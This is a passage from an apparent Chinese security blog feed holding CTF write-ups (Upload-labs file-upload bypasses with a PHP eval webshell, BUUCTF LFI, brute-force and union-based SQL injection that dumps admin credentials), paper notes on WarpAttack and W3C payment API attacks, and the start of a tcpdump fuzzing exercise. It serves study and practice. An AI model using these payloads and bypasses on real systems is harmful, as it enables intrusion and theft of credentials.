src="/2023/09/07/Upload-labs2/image-20230907165625505.png" alt="image-20230907165625505"></p><p>利用时间差，根据源码可以知道，上传的逻辑是：如果上传一个jpg，png，gif图片，成功了则改名并保存，若没成功则删除，则可以通过burpsuite进行攻击，不断的上传文件，并不断的访问该文件，直到访问成功</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs1</title>
    <link href="/2023/09/05/Upload-labs/"/>
    <url>/2023/09/05/Upload-labs/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" alt="image-20230905105954741"></p><p><strong>创建一句话php</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" alt="image-20230905110036360"></p><ul><li><code>@</code>：错误抑制符号，可以阻止PHP报告eval函数执行中的错误</li><li><code>eval</code>：接受一个字符串作为参数，将其作为PHP代码执行</li><li><code>$_POST(&#39;shell&#39;)</code>：POST请求变量，包含一个名为shell的参数</li></ul><p><strong>上传尝试</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" alt="image-20230905110908269"></p><p>猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传</p><p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" alt="image-20230905111208945"></p><p>上传成功，查看传输的路径</p><p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" alt="image-20230905111248987"></p><p>通过蚁剑进行连接</p><p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" alt="image-20230905111418459"></p><p>在根目录下即可找到flag</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>依然通过一句话php木马进行尝试</p><p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" alt="image-20230905111610103"></p><p>通过Burpsuite进行抓包</p><p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" alt="image-20230905111716152"></p><p>Content-Type显示为text&#x2F;php，修改为image&#x2F;jpeg，重发</p><p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" alt="image-20230905113245564"></p><p>得到路径，其余操作与Pass-01相同</p><p>利用该漏洞的关键函数：<code>mime_content_type()</code></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" alt="image-20230905133923792"></p><p>基于黑名单绕过，通常方法有以下几种：</p><ul><li>上传不常见的php拓展名：pht, phpt, phtml, php3,php4,php5,php6</li><li>有些会忽略大小写：Php，PHp，pHp之类的</li><li>解析漏洞：例如apache，iis，nginx（需要继续了解，后续单独写博客）</li></ul><p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" alt="image-20230905134828992"></p><p>修改后缀即可</p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" alt="image-20230906131705456"></p><p>屏蔽了所有的拓展名，所以可以通过基于白名单的绕过进行文件上传：%00截断：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" alt="image-20230906131758825"></p><p>也可以通过上传.htaccess文件绕过</p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" alt="image-20230906135624141"></p><p>对比之前的题目，可以发现，少了将文件名全部转化成小写这一步，所以可以通过大小写混合进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" alt="image-20230906140256010"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" alt="image-20230906142332590"></p><p>并未去除首尾的空格，可以通过添加空格的方式绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" alt="image-20230906143052256"></p><p>因为此时服务器获得的文件后缀是php+空格，不在黑明单中，所以可以实现绕过</p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" alt="image-20230906143845354"></p><p>代码中没有过滤点，可以通过加点进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" alt="image-20230906144030007"></p><p>此时，服务器获取到的后缀是空，不在黑名单中</p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" alt="image-20230906150046786"></p><p>源码没有过滤::DATA，可以利用windows的特性</p><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，目的就是不检查后缀名</p><p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" alt="image-20230906150026942"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" alt="image-20230906153208872"></p><p>由于代码没有写循环，代表对于 <code>.</code> 和 <code> space</code>的过滤只会进行一遍，所以可以通过在后缀名后添加 <code>. .</code>来进行绕过</p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" alt="image-20230906153917267"></p><p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>：函数调用会查找 <code>$file_name</code> 中包含在 <code>$deny_ext</code> 数组中的任何子字符串，然后将它们替换为空字符串，即删除这些子字符串</p><p>所以可以通过双写进行绕过，在处理 <code>pphphp</code>时，由于上述函数，中间的php将被替换成空，该后缀仍然会被解析成php</p><p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" alt="image-20230906154338920"></p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LFI</title>
    <link href="/2023/09/05/LFI/"/>
    <url>/2023/09/05/LFI/</url>
    
    <content type="html"><![CDATA[<h2 id="LFI文件传输漏洞"><a href="#LFI文件传输漏洞" class="headerlink" title="LFI文件传输漏洞"></a>LFI文件传输漏洞</h2>]]></content>
    
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFWriteUp1</title>
    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
    <url>/2023/09/02/BUUCTFWriteUp1/</url>
    
    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p><p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p><p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p><p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p><p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flag可以直接得到flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>进入靶机后以下界面：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p><p>用burpsuite抓包可以得到以下信息</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p><p>所以构造：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p><p>当用户名为admin时：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>所以修改payload：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>得到正确的值6490</p><p>至此得到用户名为admin，密码为6490，输入可以得到flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>随便点击</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p><p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p><p>判断or是否被过滤：</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>判断列数：</p><p><code>?id=1 order by 1</code> 有回显</p><p><code>?id=1 order by 2</code>有回显</p><p><code>?id=1 order by 3</code>无回显</p><p>所以表有两列</p><p>确定字段的显示顺序</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>爆破数据库：</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>根据获得的数据库的名称，获取数据表的信息</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p><p>使用admin表，获取字段信息</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p><p>获取username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>获取密码</p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>根据得到的信息即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper2</title>
    <link href="/2023/07/27/ReadPaper2/"/>
    <url>/2023/07/27/ReadPaper2/</url>
    
    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>如今多数系统上运行的软件是由C&#x2F;C++编写的，容易出现内存损坏错误，因此需要对这些程序进行彻底的测试以尽可能的消除错误，但通常测试时不完整的，因此会在代码中添加缓解措施以增加攻击的难度，广泛应用的措施有：</p><p>地址空间布局随机话（ASLR）：操作系统在加载进程的时候，会随机地改变可执行文件、共享库、堆栈和其他内存区域的基地址，使得这些区域在每次运行时都位于不同的内存地址位置。</p><p>堆栈canaries（Stack Canaries）：通过在函数返回地址之前或之后插入一个特殊的随机值（称为堆栈金丝雀或堆栈哨兵），来检测堆栈缓冲区溢出攻击。在函数执行结束时，系统会检查这个堆栈金丝雀的值是否被修改过，如果被修改，就说明发生了堆栈缓冲区溢出攻击。如果检测到这种异常情况，程序通常会立即终止执行，从而防止恶意代码得以执行。</p><p>数据执行预防（DEP）：通过硬件和操作系统的支持，在内存中标记某些区域为”不可执行”，也就是阻止这些区域的数据作为指令被执行。这样一来，即使攻击者成功注入恶意代码到内存中，也无法执行，因为这些区域被标记为只能包含数据而不能执行指令。</p><p>代码重用攻击在这些缓解措施下仍然有效，例如ROP（返回导向编程），针对这一点，CFI（Control-Flow Integrity）被认为是阻止代码重用攻击的关键措施。CFI首先静态计算程序的控制流图（CFG），并确定所有合法的控制流传输目标。然后，CFI会在代码中插入检查，以在运行时验证每个控制流传输。</p><p>但目前的编译器对于缓解措施插入的安全检查代码并不会视为特权代码，所以在进行代码优化时，可能导致安全性遭到破坏使攻击者有Time-of-Check to Time-Of-Use（TOCTTOU）的机会 。</p><p>例如：代码中存在switch语句，执行时通常遵循以下模式，给定一个跳转表和一个索引，程序首先获取索引值以验证边界检查是否满足跳转表大小，然后再次获取索引值以进行实际的跳转处理。由于索引被多次加载（获取），攻击者可以在边界检查后覆盖索引值，最终允许在跳转表之外进行任意跳转。</p><p>本文研究了由双重获取引入的TOCTOU漏洞，并提出了攻击WarpAttack，并在firefox上成功实施</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>攻击者能力：</p><ul><li>任意读写：攻击者持有一个内存损坏漏洞（如use-after-free错误），使其能够读写任意内存。C&#x2F;C++ 程序容易受到此类漏洞的影响</li><li>线程控制：攻击者能够主动控制与被攻击程序在同一地址空间内的线程。</li><li>Gadget：受害者程序包含足够的 gadget 代码片段，即带有编译器引入的双重获取的开关跳转表。</li></ul><p><em>Gadget 是一种有用的构造块，可以被组合成攻击载荷，以绕过程序的安全措施和执行恶意操作。这些构造块通常是由程序本身的代码片段组成，例如函数的一部分或条件分支的一小段代码。</em></p><p>攻击者目标是劫持控制流到特定位置</p><p>防御假设：</p><p>不可执行内存：受害者程序受到DEP保护，攻击者无法执行任何注入式攻击，只能进行代码重用攻击</p><p>随机化：受害者程序受地址空间随机化保护</p><p>控制流保护：受害者程序应用完全精确的静态 CFI</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper1:WPA</title>
    <link href="/2023/07/26/ReadPaper1/"/>
    <url>/2023/07/26/ReadPaper1/</url>
    
    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>当下支付环境多样，有Stripe，Google pay，PayPal等多种支付方式，存在的问题有：</p><ul><li>恶意顾客可能会篡改商家与支付处理机构之间的信息流</li><li>支付处理机构的方案可能存在缺陷</li><li>用户可能会被多种不同的用户界面所困惑，从而更容易受到网络钓鱼攻击</li></ul><p>此外，在面对有些支付界面较为复杂时，用户可能直接关闭支付进程</p><p>为此，W3C（World Wide Web Consortium）目前正在开发WPA（Web Payment APIs）这是一种简化和标准化浏览器中的支付和结账流程的方法。其主要思想是，商家不再自己提供用于结账的网页或JavaScript，而是将这个过程交给用户的Web浏览器来处理。浏览器随后呈现给用户全新的支付用户界面（见图1），该界面位于Web上下文之外。在这个用户界面中，用户可以查看订单，选择（预先存储的）送货地址、支付方式和支付处理器（例如使用Stripe信用卡付款）。</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>本文的分析是在详细的Web基础设施模型中，对Web Payment的首次分析</li><li>分析基于迄今为止最全面的Web基础设施模型——WIM，并做出了重要扩展</li><li>制定了反映使用WPA进行支付的完整性的精确安全属性：支付意图和支付唯一性。在尝试证明这些属性时，发现了两个关键性的漏洞，并提出了修复措施</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h4><p><strong>支付意图</strong></p><p>浏览器会将用户表达意图的所有支付存储在一个名为PaymentIntents的字典中，它保证了支付提供者在进行交易时与顾客在支付UI界面中确认的信息一致。具体来说，这意味着支付的发送方、接收方和总金额与顾客在浏览器中确认的信息相符。这个属性可以防止恶意方代表顾客进行未经授权的支付。</p><p><strong>支付唯一性</strong></p><p>每个支付提供者则在其状态中存储所有已执行交易的记录，存储在一个名为”transactions”的映射表中，支付的唯一性确保对于客户授权的每笔付款，任何诚实的支付提供者最多执行一个交易，并且该交易具有正确的值。</p><h4 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>商家创建支付请求，支付请求中包含字段：id（支付的唯一标识符）&#x2F;商家接受的支付方法（methodData）&#x2F;总花费和一些商品可选细节（details）&#x2F;用户必须提供哪些数据（options：例如地址，电话）</li><li>通过Payment Request API将数据交给浏览器，浏览器根据支付请求中的 methodData（商家支持的支付方式）与已注册的支付处理程序进行对比，并选择在 methodData 中至少一种支付方式注册的所有支付处理程序。</li><li>在进行初步选择后，浏览器对每个选中的支付处理程序触发 CanMakePaymentEvent（支付是否可进行事件）。此事件包含有关所请求支付的基本信息，如商家顶层页面的源地址、支付请求发起的源地址以及适用的支付方式数据集（来自 PR.methodData）</li><li>支付处理程序在接收 CanMakePaymentEvent 后确定是否可以处理该支付请求。此决策过程特定于支付方式，并可能取决于法律要求。</li><li>在接收完所有触发的支付处理程序的响应后，浏览器显示一个特殊的对话框，称为支付 UI（用户界面）。这个支付 UI 不是网站的一部分，而是浏览器本身的界面（参见图1）。支付 UI 允许顾客输入（或选择存储的）所需信息，如送货地址、电子邮件地址以及支付详细信息。</li><li>支付详细信息包括选择可用支付处理程序和支付方式。如果顾客输入（或选择存储的或更改的）送货地址，还需要额外的步骤：因为这可能会改变送货费用，因此商家网站会收到一个部分匿名化的地址以重新计算送货费用。</li><li>顾客提交选择后，浏览器组装一个 PaymentRequestEvent（支付请求事件）并将其交给顾客选择的支付处理程序。该 PaymentRequestEvent 包含与 CanMakePaymentEvent 相同的数据（见上文），以及顾客输入的支付数据，如信用卡号、过期日期和验证号码。</li><li>在接收 PaymentRequestEvent 后，支付处理程序采取必要的步骤来执行或至少促进支付。</li><li>在执行这些步骤后，支付处理程序通过创建 PaymentHandlerResponse（支付处理程序响应）来完成其工作。此响应包含（再次）支付方式标识符和一个 details 字段，其确切内容取决于支付方式。details 的内容可以是支付提供者的某些签名支付确认，或者仅为“反映”信用卡数据等简单内容。</li><li>收到支付处理程序响应后，浏览器创建一个支付响应并将其返回给商家的网站。支付响应包含来自处理程序响应的 details、所选支付方式以及商家在 PR.options 中请求的额外数据，如送货地址。</li><li>商家现在可以检查响应（例如，验证信用卡数据的有效性）并通过表示结账过程完成（在这种情况下，浏览器关闭支付 UI）或表示出现问题而终止流程。</li></ol><p>一旦顾客进行了修改并重新提交，浏览器会向随后选择的支付处理程序触发另一个 PaymentRequestEvent，其中包含相同的支付标识符，但可能不同的支付细节（例如，由顾客选择的不同支付方式）。支付处理程序然后处理并可能更新支付（如有必要），再次用处理程序响应触发浏览器创建支付响应并将其交给商家。此时，商家可以再次接受支付响应或发起另一个重试。</p><h4 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h4><p><strong>Double Charging with Retry（重试引起的重复支付）</strong></p><p>在这个攻击过程中，假设有一个恶意商家和一个诚实的顾客。攻击利用了WPA中的重试机制。</p><ol><li>顾客发起结账：顾客在恶意商家的网站上发起结账请求。</li><li>商家创建支付请求：商家创建一个正常的支付请求，并将其交给浏览器处理。</li><li>浏览器引导支付流程：浏览器根据WPA规范的步骤，引导顾客完成支付流程的步骤6到11，这包括选择支付方式、确认支付等。</li><li>收到支付响应：商家收到顾客的支付响应，但在这里进行了攻击。</li><li>触发重试：商家触发了一个重试请求（retry），这意味着商家在第一次支付时出现了问题，要求顾客切换到不同的支付处理器和支付方式提供商，因为第一个支付方式据称不起作用。</li><li>显示错误信息：浏览器在其支付界面中显示了错误信息，告知顾客需要切换支付方式。</li><li>顾客选择不同的支付方式：由于顾客认为第一个支付方式存在问题，她选择了不同的支付处理器和支付方式提供商，并再次提交支付请求。</li><li>触发新的支付处理器：浏览器触发了新的支付处理器，该处理器执行第二次支付。</li><li>第二次支付：新的支付处理器执行了第二次支付，这就是攻击实现了双重收费的地方。</li><li>结账完成：攻击完成后，整个结账流程继续进行，顾客完成了支付流程，而没有任何提示表明她支付了两次。</li></ol><p>这个攻击是由于浏览器的行为，而不是支付处理器的实现。第二个支付处理器无法检测到它是在重试上下文中调用的，因为它之前没有见过整个交易的支付id。攻击者可以反复利用这个漏洞，让顾客反复被收取双重费用，而商家和支付处理器无法察觉。</p><p>修复措施：</p><p>可以在交易重复使用不同处理程序时通知支付处理程序，以便它可以撤销支付并在成功撤销后再触发第二个支付处理程序。或者支付处理程序可以在其响应中包含一个状态，指示是否已经进行了支付，并阻止在这种情况下更改支付处理程序。在与W3C Web Payments Working Group的讨论中，他们选择了一个非常简单的修复方法，即完全禁止更改支付处理程序，尽管这可能会迫使顾客中止整个流程，如果一开始选择的支付处理程序实际上不能正常工作。这是规范最终采用的方法。</p><p><strong>Ambiguous Payment Method Data（模棱两可的支付数据）</strong></p><p>在这个攻击过程中，假设商家是恶意的，而其他人都是诚实的。攻击利用了WPA规范中的一个特定字段——methodData。以下是攻击的步骤：</p><ol><li>商家创建支付请求：商家创建一个支付请求PR，其中methodData字段包含两个条目，都是相同的支付方式，即具有相同的支付方式标识符。根据W3C规范，这是完全有效的。其中一个条目可能不包含任何费用，而另一个可能包含非常高的费用。</li><li>提交支付请求：商家将支付请求PR提交给WPA（如往常一样）。这触发浏览器在其安装的支付处理器列表中搜索与PR中给定的支付方式标识符匹配的处理器，并查询匹配的处理器。</li><li>显示支付界面：之后，浏览器显示支付界面。我们假设用户总是选择第一个条目，即不包含额外费用的条目。她输入所需数据并提交。</li><li>调用支付处理器：现在，浏览器将带有支付细节的PaymentRequestEvent（包括完整的methodData列表，即两个条目）交给所选的支付处理器。</li><li>支付处理器决策：然而，PaymentRequestEvent不包含用户从methodData中选择了哪个条目的信息。支付处理器现在必须决定使用哪个支付方式数据条目。由于规范中也没有关于此的指导，我们假设支付处理器总是选择最后一个支付方式数据条目（在我们的攻击中会产生巨额的额外费用）并执行支付。</li><li>完成支付：其余步骤与常规支付流程相同。结果是，顾客被收取了她从未同意的费用，而没有任何提示。</li></ol><p>这种攻击并不依赖于浏览器和支付处理器在存在多个适用的methodData条目时如何确定选择哪一个，只要存在这样的可能性，它们选择不同的条目即可。这使得顾客被收取未知费用的攻击成为可能。</p><p>修复措施：</p><p>浏览器可以拒绝模棱两可的条目，或者将用户的选择传递给支付处理程序。我们建议采用第一种选项，以保持API接口的稳定性。因为每次用户选择的变化都可能需要更新支付处理程序的实现，导致接口的不稳定性和不一致性。</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>为了全面分析WPA，对WIM做出了以下拓展</p><ol><li>可扩展的DOM事件处理：WPA大量使用DOM事件来触发支付处理程序。为了模拟这些事件的处理过程，WIM（Web Infrastructure Model）的浏览器模型被扩展，引入了一组待处理事件和一个可扩展的处理函数。当浏览器被触发处理DOM事件时，其中一个待处理事件会被随机选择，从待处理事件集合中移除，并交给处理函数处理。这样，模拟了事件的传递和处理过程。</li><li>Service Workers：Service Workers是在浏览器中后台运行的事件驱动型JavaScript程序，可用于为Web应用程序提供离线功能。在WPA中，支付处理程序被视为Service Workers的实例。因此，WIM的浏览器模型被扩展，加入了一组注册的Service Workers。类似于事件处理，当浏览器被触发时，Service Worker可以被非确定性地选择执行，从而模拟了Service Worker的运行过程。</li><li>脚本API扩展：WPA本身是WIM浏览器模型的重要扩展。WPA已被各大主流浏览器实现，这导致了在真实执行环境中，网页应用程序和脚本（诚实或不诚实）可能会干扰WPA的各个部分，从而扩大了攻击面。为此，WIM的脚本API被扩展，将WPA规范中定义的API函数形式化为脚本命令，即脚本可以输出命令，指示浏览器调用具有给定参数列表的API函数。这些API函数的定义遵循WPA规范，并允许对其进行形式化的分析。</li></ol><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>为什么此处对于WPA模型安全性的分析都是假设商家是恶意的而用户是诚实的</strong></p><p>个人理解：首先，用户的行为通常是会受到较大约束的，发起主动攻击的难度较大。多数攻击是针对正常运作的系统发起的。虽然用户的一些攻击行为可能会获取不当利益，例如进行虚假支付。但是从安全研究的角度来看，通常更关注的是那些针对系统本身的漏洞和攻击。其次，当进行系统安全性评估和漏洞分析时，假设商家是恶意的可以帮助研究人员更好地理解系统的脆弱点和潜在风险。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise3</title>
    <link href="/2023/07/22/Exercise3/"/>
    <url>/2023/07/22/Exercise3/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise3-TCPdump"><a href="#Exercise3-TCPdump" class="headerlink" title="Exercise3 TCPdump"></a>Exercise3 TCPdump</h2><h3 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h3><ul><li>在TCPdump4.9.2中找到 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/"><strong>CVE-2017-13028</strong></a>的崩溃</li><li>了解什么是Address Sanitizer</li><li>了解如何使用ASan模糊目标分析崩溃</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p><strong>下载安装TCPdump</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span><br>mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/<br><br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/the-tcpdump-group/</span>tcpdump<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br>tar -xzvf tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise2</title>
    <link href="/2023/07/19/Exercise2/"/>
    <url>/2023/07/19/Exercise2/</url>
    
